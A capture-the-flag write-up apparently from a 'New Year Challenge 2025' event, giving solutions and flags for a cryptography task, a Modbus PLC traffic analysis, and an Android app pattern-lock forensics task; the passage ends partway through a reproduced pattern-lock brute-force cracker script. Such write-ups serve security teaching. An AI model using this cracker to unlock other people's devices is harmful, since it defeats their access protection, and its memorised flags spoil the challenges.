<p>Cryptography / Medium / 100 (pts)</p>

<p>Description:</p>

<p>While Shanks was looking for the One Piece, he found this encrypted flag that was said to guide you to the One Piece, can you help him?</p>

<p>The given data is:</p>

<div class="language-ini highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="py">n</span> <span class="p">=</span> <span class="s">100877806580164361109432032005997023263576622341181642177532225015165831192531617284237232394810126138303518097999732573544724845159494418613403332447939798603756935483027253956250954027519877279970585328391988407505644914807188569830853273734260922470799656992004484041859916458226992861831862355220985442063</span>

<span class="py">p</span> <span class="p">=</span> <span class="s">166632889737946751774729831850051340173923789682364639132773496994940951170736135769399065367498423865365775612016029141202750681571995841145229744021576866801324674038774542536760476598001960524267256469608768561127494531270871001958550550609802641729152386485321063274157653468251668857533405190949582743431</span>

<span class="py">encrypted_flag</span> <span class="p">=</span> <span class="s">550bc9169355ccc02aef03074dd40de5a58f1d88f23fd7beaf3a22baba7c7f91</span>

</code></pre></div></div>

<p>The encryption script</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">getPrime</span>
<span class="kn">from</span> <span class="nn">secrets</span> <span class="kn">import</span> <span class="n">randbelow</span>
<span class="kn">from</span> <span class="nn">secret</span> <span class="kn">import</span> <span class="n">flag</span>
<span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
<span class="kn">from</span> <span class="nn">Crypto.Util.Padding</span> <span class="kn">import</span> <span class="n">pad</span>
<span class="kn">import</span> <span class="nn">hashlib</span>

<span class="k">class</span> <span class="nc">Shanks</span><span class="p">:</span>
    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="p">.</span><span class="n">n</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">p</span><span class="p">,</span> <span class="bp">self</span><span class="p">.</span><span class="n">key</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">key_gen</span><span class="p">()</span>

    <span class="k">def</span> <span class="nf">key_gen</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">getPrime</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
        <span class="n">key</span> <span class="o">=</span> <span class="n">randbelow</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
        <span class="n">n</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">n</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">key</span>

    <span class="k">def</span> <span class="nf">AES_encrypt</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">plain</span><span class="p">):</span>
        <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="n">hashlib</span><span class="p">.</span><span class="n">sha256</span><span class="p">(</span><span class="bp">self</span><span class="p">.</span><span class="n">key</span><span class="p">.</span><span class="n">to_bytes</span><span class="p">((</span><span class="bp">self</span><span class="p">.</span><span class="n">key</span><span class="p">.</span><span class="n">bit_length</span><span class="p">()</span> <span class="o">+</span> <span class="mi">7</span><span class="p">)</span> <span class="o">//</span> <span class="mi">8</span><span class="p">,</span> <span class="s">'big'</span><span class="p">)).</span><span class="n">digest</span><span class="p">(),</span> <span class="n">AES</span><span class="p">.</span><span class="n">MODE_ECB</span><span class="p">)</span>
        <span class="n">padded_plain</span> <span class="o">=</span> <span class="n">pad</span><span class="p">(</span><span class="n">plain</span><span class="p">.</span><span class="n">encode</span><span class="p">(),</span> <span class="n">AES</span><span class="p">.</span><span class="n">block_size</span><span class="p">)</span>
        <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">cipher</span><span class="p">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">padded_plain</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">ciphertext</span><span class="p">.</span><span class="nb">hex</span><span class="p">()</span>


<span class="n">Shanks</span> <span class="o">=</span> <span class="n">Shanks</span><span class="p">()</span>
<span class="n">encrypted_flag</span> <span class="o">=</span> <span class="n">Shanks</span><span class="p">.</span><span class="n">AES_encrypt</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'output.txt'</span><span class="p">,</span> <span class="s">'w'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">"n ="</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">Shanks</span><span class="p">.</span><span class="n">n</span><span class="p">)</span> <span class="o">+</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
    <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">"p ="</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">Shanks</span><span class="p">.</span><span class="n">p</span><span class="p">)</span> <span class="o">+</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
    <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">"encrypted_flag ="</span> <span class="o">+</span> <span class="n">encrypted_flag</span> <span class="o">+</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
</code></pre></div></div>

<hr />

<p>The challenge is a simple RSA encryption, where the key is the square root of (n) modulo (p). The encryption is done using AES in ECB mode with a key derived from the square root of (n). The task is to recover the key and decrypt the flag.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">hashlib</span>
<span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
<span class="kn">from</span> <span class="nn">Crypto.Util.Padding</span> <span class="kn">import</span> <span class="n">unpad</span>
<span class="kn">from</span> <span class="nn">sympy</span> <span class="kn">import</span> <span class="n">sqrt_mod</span>

<span class="k">def</span> <span class="nf">decrypt_flag</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">enc_hex</span><span class="p">):</span>
    <span class="n">enc</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">enc_hex</span><span class="p">)</span>

    <span class="c1"># Compute one modular square root of n
</span>    <span class="n">root</span> <span class="o">=</span> <span class="n">sqrt_mod</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="n">p</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">try_root</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
        <span class="n">r_bytes</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">to_bytes</span><span class="p">((</span><span class="n">r</span><span class="p">.</span><span class="n">bit_length</span><span class="p">()</span> <span class="o">+</span> <span class="mi">7</span><span class="p">)</span> <span class="o">//</span> <span class="mi">8</span><span class="p">,</span> <span class="s">'big'</span><span class="p">)</span>
        <span class="n">aes_key</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">sha256</span><span class="p">(</span><span class="n">r_bytes</span><span class="p">).</span><span class="n">digest</span><span class="p">()</span>
        <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="n">aes_key</span><span class="p">,</span> <span class="n">AES</span><span class="p">.</span><span class="n">MODE_ECB</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">cipher</span><span class="p">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">enc</span><span class="p">)</span>

    <span class="c1"># First root
</span>    <span class="k">try</span><span class="p">:</span>
        <span class="n">pt</span> <span class="o">=</span> <span class="n">unpad</span><span class="p">(</span><span class="n">try_root</span><span class="p">(</span><span class="n">root</span><span class="p">),</span> <span class="n">AES</span><span class="p">.</span><span class="n">block_size</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">pt</span><span class="p">.</span><span class="n">decode</span><span class="p">()</span>
    <span class="k">except</span> <span class="nb">ValueError</span><span class="p">:</span>
        <span class="c1"># If padding fails, try the other root
</span>        <span class="n">pt_alt</span> <span class="o">=</span> <span class="n">unpad</span><span class="p">(</span><span class="n">try_root</span><span class="p">(</span><span class="n">p</span> <span class="o">-</span> <span class="n">root</span><span class="p">),</span> <span class="n">AES</span><span class="p">.</span><span class="n">block_size</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">pt_alt</span><span class="p">.</span><span class="n">decode</span><span class="p">()</span>

<span class="c1"># Provided challenge data
</span><span class="n">n</span> <span class="o">=</span> <span class="mi">100877806580164361109432032005997023263576622341181642177532225015165831192531617284237232394810126138303518097999732573544724845159494418613403332447939798603756935483027253956250954027519877279970585328391988407505644914807188569830853273734260922470799656992004484041859916458226992861831862355220985442063</span>
<span class="n">p</span> <span class="o">=</span> <span class="mi">166632889737946751774729831850051340173923789682364639132773496994940951170736135769399065367498423865365775612016029141202750681571995841145229744021576866801324674038774542536760476598001960524267256469608768561127494531270871001958550550609802641729152386485321063274157653468251668857533405190949582743431</span>
<span class="n">enc_flag</span> <span class="o">=</span> <span class="s">"550bc9169355ccc02aef03074dd40de5a58f1d88f23fd7beaf3a22baba7c7f91"</span>

<span class="n">flag</span> <span class="o">=</span> <span class="n">decrypt_flag</span><span class="p">(</span><span class="n">n</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">enc_flag</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Flag:"</span><span class="p">,</span> <span class="n">flag</span><span class="p">)</span>
</code></pre></div></div>

<p>The flag is <code class="language-plaintext highlighter-rouge">flag{5H4NK5_F0UND_7H3_0N3_r007}</code></p>

<hr />

<h1 id="new-year-challenge-2025--fieldbus">New Year Challenge 2025 » FieldBUS</h1>
<p>Network Security / Medium / 100 (pts)</p>

<p>Flag format: flag{text}</p>

<p>Description:</p>

<p>Our intrusion detection system has flagged suspicious network traffic directed at one of the critical PLCs controlling chlorine injection.
Initial analysis suggests someone is attempting to upload new instructions to the PLC. Your task is to investigate what happened.</p>

<p>You are given a <code class="language-plaintext highlighter-rouge">fieldbus.pcapng</code> file, which is a capture file.</p>

<hr />

<p>Searching google for what <code class="language-plaintext highlighter-rouge">fieldbus</code> is, you find that it’s a protocol used in industrial control systems, and you can use <a href="https://www.wireshark.org/">Wireshark</a> to analyze the capture file.
Some more googling and manual readings and scripting you will be able to make simple script to extract the flag.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">pyshark</span>

<span class="n">capture</span> <span class="o">=</span> <span class="n">pyshark</span><span class="p">.</span><span class="n">FileCapture</span><span class="p">(</span><span class="s">"./fieldbus.pcapng"</span><span class="p">,</span> <span class="n">display_filter</span><span class="o">=</span><span class="sa">f</span><span class="s">"tcp.dstport == 502 &amp;&amp; modbus"</span><span class="p">)</span>

<span class="n">binary_data</span> <span class="o">=</span> <span class="s">""</span>
<span class="k">for</span> <span class="n">packet</span> <span class="ow">in</span> <span class="n">capture</span><span class="p">:</span>
    <span class="n">bin_data</span> <span class="o">=</span> <span class="n">packet</span><span class="p">.</span><span class="n">modbus</span><span class="p">.</span><span class="n">data</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="s">":"</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span>
    <span class="n">binary_data</span> <span class="o">+=</span> <span class="s">"1"</span> <span class="k">if</span> <span class="n">bin_data</span> <span class="o">==</span> <span class="s">"ff00"</span> <span class="k">else</span> <span class="s">"0"</span>

<span class="n">ascii_output</span> <span class="o">=</span> <span class="s">""</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">binary_data</span><span class="p">),</span> <span class="mi">8</span><span class="p">):</span>
    <span class="n">byte_segment</span> <span class="o">=</span> <span class="n">binary_data</span><span class="p">[</span><span class="n">i</span> <span class="p">:</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">8</span><span class="p">]</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">byte_segment</span><span class="p">)</span> <span class="o">==</span> <span class="mi">8</span><span class="p">:</span>
        <span class="n">ascii_output</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">byte_segment</span><span class="p">,</span> <span class="mi">2</span><span class="p">))</span>

<span class="k">print</span><span class="p">(</span><span class="n">ascii_output</span><span class="p">)</span>
</code></pre></div></div>

<p>The flag is <code class="language-plaintext highlighter-rouge">flag{modbus_FYR}</code></p>

<hr />

<h1 id="new-year-challenge-2025--th3-lock3r">New Year Challenge 2025 » Th3 Lock3R</h1>
<p>Digital Forensics / Medium / 100 (pts)</p>

<p>Flag Format: Flag{Pattern}</p>

<p>Description:</p>

<p>I downloaded an application from the internet that locks my phone with a pattern, but now I can’t remember the pattern I set. I didn’t back up my data on the cloud, and formatting the device isn’t an option because I need to keep my files. Now, I’m stuck and need help uncovering a way to unlock my phone without losing any of my important data.</p>

<p>You are provided with <code class="language-plaintext highlighter-rouge">th3_Lock3R.7z</code> file, which is a 7z compressed file containing ad1 image file.</p>

<hr />

<p>The challenge is a simple forensic challenge, you can use <code class="language-plaintext highlighter-rouge">FTK Imager</code> to mount the image, i personally don’t like to use the GUI, so i extracted the entire image and copied over to my pentesting machine, then i started searching around and reading the description, we know he downloaded an application to lock his phone, doing simple find on the entire image we notice <code class="language-plaintext highlighter-rouge">com.domobile.applockwatcher</code>,
going into <code class="language-plaintext highlighter-rouge">data/data/com.domobile.applockwatcher</code> and searching we find something like <code class="language-plaintext highlighter-rouge">rg lock</code></p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;string</span> <span class="na">name=</span><span class="s">"pk_applock_uuid"</span><span class="nt">&gt;</span>e7123be3245d40b9b169aeb13193bf25<span class="nt">&lt;/string&gt;</span>
<span class="nt">&lt;boolean</span> <span class="na">name=</span><span class="s">"is_image_lock_pattern"</span> <span class="na">value=</span><span class="s">"true"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;boolean</span> <span class="na">name=</span><span class="s">"vibrate_pattern_lock"</span> <span class="na">value=</span><span class="s">"false"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;string</span> <span class="na">name=</span><span class="s">"image_lock_pattern"</span><span class="nt">&gt;</span>9Wpt8KhfWw6x5mG1g27UI1Qq+oY=<span class="nt">&lt;/string&gt;</span>
</code></pre></div></div>
<p>the value of <code class="language-plaintext highlighter-rouge">image_lock_pattern</code> is interesting which look like base64 encoded string, decoding it you some unreadable characters, searching around the web for how to unlock android pattern lock, 
eventually you come cross a blog post <a href="https://medium.com/@k3r0/hack-application-pattern-lock-5ade6b8128dc">Hack Application Pattern Lock</a>, which it seems the author used as source for this challenge, as it describes the same steps to unlock the pattern lock. Following the steps you get the script</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
#
#  Copyright (c) 2012, Chema Garcia
#  All rights reserved.
</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">multiprocessing</span>
<span class="kn">import</span> <span class="nn">hashlib</span>
<span class="kn">import</span> <span class="nn">binascii</span>
<span class="kn">import</span> <span class="nn">itertools</span>

<span class="n">MATRIX_SIZE</span> <span class="o">=</span> <span class="p">[</span><span class="mi">3</span><span class="p">,</span><span class="mi">3</span><span class="p">]</span>
<span class="n">MAX_LEN</span> <span class="o">=</span> <span class="n">MATRIX_SIZE</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">*</span><span class="n">MATRIX_SIZE</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">MIN_POSITIONS_NUMBER</span> <span class="o">=</span> <span class="mi">3</span>
<span class="n">FOUND</span> <span class="o">=</span> <span class="n">multiprocessing</span><span class="p">.</span><span class="n">Event</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">lookup</span><span class="p">(</span><span class="n">param</span><span class="p">):</span>
    <span class="k">global</span> <span class="n">FOUND</span>
    <span class="n">lenhash</span> <span class="o">=</span> <span class="n">param</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
    <span class="n">target</span> <span class="o">=</span> <span class="n">param</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
    <span class="n">positions</span> <span class="o">=</span> <span class="n">param</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>

    <span class="k">if</span> <span class="n">FOUND</span><span class="p">.</span><span class="n">is_set</span><span class="p">()</span> <span class="ow">is</span> <span class="bp">True</span><span class="p">:</span>
        <span class="k">return</span> <span class="bp">None</span>

    <span class="c1"># get all possible permutations
</span>    <span class="n">perms</span> <span class="o">=</span> <span class="n">itertools</span><span class="p">.</span><span class="n">permutations</span><span class="p">(</span><span class="n">positions</span><span class="p">,</span> <span class="n">lenhash</span><span class="p">)</span>
    <span class="c1"># for each permutation
</span>    <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="n">perms</span><span class="p">:</span>
        <span class="c1"># build the pattern string
</span>        <span class="k">if</span> <span class="n">FOUND</span><span class="p">.</span><span class="n">is_set</span><span class="p">()</span> <span class="ow">is</span> <span class="bp">True</span><span class="p">:</span>
            <span class="k">return</span> <span class="bp">None</span>
        <span class="n">pattern</span> <span class="o">=</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="k">for</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">item</span><span class="p">)</span>
        <span class="c1"># convert the pattern to hex (so the string '123' becomes '\x01\x02\x03')
</span>        <span class="n">key</span> <span class="o">=</span> <span class="n">binascii</span><span class="p">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="s">'%02x'</span> <span class="o">%</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">-</span> <span class="nb">ord</span><span class="p">(</span><span class="s">'0'</span><span class="p">))</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">pattern</span><span class="p">))</span>
        <span class="c1"># compute the hash for that key
</span>        <span class="n">sha1</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">sha1</span><span class="p">(</span><span class="n">key</span><span class="p">).</span><span class="n">hexdigest</span><span class="p">()</span>
        <span class="c1"># pattern found
</span>        <span class="k">if</span> <span class="n">sha1</span> <span class="o">==</span> <span class="n">target</span><span class="p">:</span>
            <span class="n">FOUND</span><span class="p">.</span><span class="nb">set</span><span class="p">()</span>
            <span class="k">return</span> <span class="n">pattern</span>
    <span class="c1"># pattern not found
</span>    <span class="k">return</span> <span class="bp">None</span>

<span class="k">def</span> <span class="nf">show_pattern</span><span class="p">(</span><span class="n">pattern</span><span class="p">):</span>
    <span class="s">"""
    Shows the pattern "graphically"
    """</span>

    <span class="n">gesture</span> <span class="o">=</span> <span class="p">[</span><span class="bp">None</span><span class="p">,</span> <span class="bp">None</span><span class="p">,</span> <span class="bp">None</span><span class="p">,</span> <span class="bp">None</span><span class="p">,</span> <span class="bp">None</span><span class="p">,</span> <span class="bp">None</span><span class="p">,</span> <span class="bp">None</span><span class="p">,</span> <span class="bp">None</span><span class="p">,</span> <span class="bp">None</span><span class="p">]</span>

    <span class="n">cont</span> <span class="o">=</span> <span class="mi">1</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">pattern</span><span class="p">:</span>
        <span class="n">gesture</span><span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">i</span><span class="p">)]</span> <span class="o">=</span> <span class="n">cont</span>
        <span class="n">cont</span> <span class="o">+=</span> <span class="mi">1</span>

    <span class="k">print</span> <span class="p">(</span><span class="s">"[+] Gesture:</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">3</span><span class="p">):</span>
        <span class="n">val</span> <span class="o">=</span> <span class="p">[</span><span class="bp">None</span><span class="p">,</span> <span class="bp">None</span><span class="p">,</span> <span class="bp">None</span><span class="p">]</span>
        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">3</span><span class="p">):</span>
            <span class="n">val</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="s">" "</span> <span class="k">if</span> <span class="n">gesture</span><span class="p">[</span><span class="n">i</span> <span class="o">*</span> <span class="mi">3</span> <span class="o">+</span> <span class="n">j</span><span class="p">]</span> <span class="ow">is</span> <span class="bp">None</span> <span class="k">else</span> <span class="nb">str</span><span class="p">(</span><span class="n">gesture</span><span class="p">[</span><span class="n">i</span> <span class="o">*</span> <span class="mi">3</span> <span class="o">+</span> <span class="n">j</span><span class="p">])</span>

        <span class="k">print</span> <span class="p">(</span><span class="s">'  -----  -----  -----'</span><span class="p">)</span>
        <span class="k">print</span> <span class="p">(</span><span class="s">'  | %s |  | %s |  | %s |  '</span> <span class="o">%</span> <span class="p">(</span><span class="n">val</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">val</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">val</span><span class="p">[</span><span class="mi">2</span><span class="p">]))</span>
        <span class="k">print</span> <span class="p">(</span><span class="s">'  -----  -----  -----'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">crack</span><span class="p">(</span><span class="n">target_hash</span><span class="p">):</span>
    <span class="n">ncores</span> <span class="o">=</span> <span class="n">multiprocessing</span><span class="p">.</span><span class="n">cpu_count</span><span class="p">()</span>
    <span class="n">pool</span> <span class="o">=</span> <span class="n">multiprocessing</span><span class="p">.</span><span class="n">Pool</span><span class="p">(</span><span class="n">ncores</span><span class="p">)</span>
    <span class="c1"># generates the matrix positions IDs
</span>    <span class="n">positions</span> <span class="o">=</span> <span class="p">[</span><span class="n">i</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">MAX_LEN</span><span class="p">)]</span>
    
    <span class="c1"># sets the length for each worker
</span>    <span class="n">generate_worker_params</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="p">[</span><span class="n">x</span><span class="p">,</span> <span class="n">target_hash</span><span class="p">,</span> <span class="n">positions</span><span class="p">]</span>
    <span class="n">params</span> <span class="o">=</span> <span class="p">[</span><span class="n">generate_worker_params</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">MIN_POSITIONS_NUMBER</span><span class="p">,</span> <span class="n">MAX_LEN</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)]</span>
    
    <span class="n">result</span> <span class="o">=</span> <span class="n">pool</span><span class="p">.</span><span class="nb">map</span><span class="p">(</span><span class="n">lookup</span><span class="p">,</span><span class="n">params</span><span class="p">)</span>
    <span class="n">pool</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
    <span class="n">pool</span><span class="p">.</span><span class="n">join</span><span class="p">()</span>
    
    <span class="n">ret</span> <span class="o">=</span> <span class="bp">None</span>
    <span class="k">for</span> <span class="n">r</span> <span class="ow">in</span> <span class="n">result</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">r</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span><span class="p">:</span>
            <span class="n">ret</span> <span class="o">=</span> <span class="n">r</span>
            <span class="k">break</span>
    <span class="k">return</span> <span class="n">ret</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="k">print</span> <span class="p">(</span><span class="s">''</span><span class="p">)</span>
    <span class="k">print</span> <span class="p">(</span><span class="s">'################################'</span><span class="p">)</span>
    <span class="k">print</span> <span class="p">(</span><span class="s">'# Android Pattern Lock Cracker #'</span><span class="p">)</span>
    <span class="k">print</span> <span class="p">(</span><span class="s">'#             v0.2             #'</span><span class="p">)</span>
    <span class="k">print</span> <span class="p">(</span><span class="s">'# ---------------------------- #'</span><span class="p">)</span>
    <span class="k">print</span> <span class="p">(</span><span class="s">'#  Written by Chema Garcia     #'</span><span class="p">)</span>
    <span class="k">print</span> <span class="p">(</span><span class="s">'#     http://safetybits.net    #'</span><span class="p">)</span>
    <span class="k">print</span> <span class="p">(</span><span class="s">'#     chema@safetybits.net     #'</span><span class="p">)</span>
    <span class="k">print</span> <span class="p">(</span><span class="s">'#          @sch3m4             #'</span><span class="p">)</span>
    <span class="k">print</span> <span class="p">(</span><span class="s">'################################</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>

    <span class="k">print</span> <span class="p">(</span><span class="s">'[i] Taken from: http://forensics.spreitzenbarth.de/2012/02/28/cracking-the-pattern-lock-on-android/</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
    
    <span class="c1"># check parameters
</span>    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
        <span class="k">print</span> <span class="p">(</span><span class="s">'[+] Usage: %s /path/to/gesture.key</span><span class="se">\n</span><span class="s">'</span> <span class="o">%</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    
    <span class="c1"># check gesture.key file
</span>    <span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">isfile</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]):</span>
        <span class="k">print</span> <span class="p">(</span><span class="s">"[e] Cannot access to %s file</span><span class="se">\n</span><span class="s">"</span> <span class="o">%</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>
        
    <span class="c1"># load SHA1 hash from file
</span>    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">'rb'</span><span class="p">)</span>
    <span class="n">gest</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="n">hashlib</span><span class="p">.</span><span class="n">sha1</span><span class="p">().</span><span class="n">digest_size</span><span class="p">).</span><span class="n">encode</span><span class="p">(</span><span class="s">'hex'</span><span class="p">)</span>
    <span class="n">f</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

    <span class="c1"># check hash length
</span>    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">gest</span><span class="p">)</span> <span class="o">/</span> <span class="mi">2</span> <span class="o">!=</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">sha1</span><span class="p">().</span><span class="n">digest_size</span><span class="p">:</span>
        <span class="k">print</span> <span class="p">(</span><span class="s">"[e] Invalid gesture file?</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">2</span><span class="p">)</span>

    <span class="c1"># try to crack the pattern
</span>    <span class="n">t0</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="n">time</span><span class="p">()</span>
    <span class="n">pattern</span> <span class="o">=</span> <span class="n">crack</span><span class="p">(</span><span class="n">gest</span><span class="p">)</span>
    <span class="n">t1</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="n">time</span><span class="p">()</span>

    <span class="k">if</span> <span class="n">pattern</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
        <span class="k">print</span> <span class="p">(</span><span class="s">"[:(] The pattern was not found..."</span><span class="p">)</span>
        <span class="n">rcode</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">print</span> <span class="p">(</span><span class="s">"[:D] The pattern has been FOUND!!! =&gt; %s</span><span class="se">\n</span><span class="s">"</span> <span class="o">%</span> <span class="n">pattern</span><span class="p">)</span>
        <span class="n">show_pattern</span><span class="p">(</span><span class="n">pattern</span><span class="p">)</span>
        <span class="k">print</span> <span class="p">(</span><span class="s">""</span><span class="p">)</span>
        <span class="k">print</span> <span class="p">(</span><span class="s">"It took: %.4f seconds"</span> <span class="o">%</span> <span class="p">(</span><span class="n">t1</span><span class="o">-</span><span class="n">t0</span><span class="p">))</span>
        <span class="n">rcode</span> <span class="o">=</span> <span class="mi">0</span>

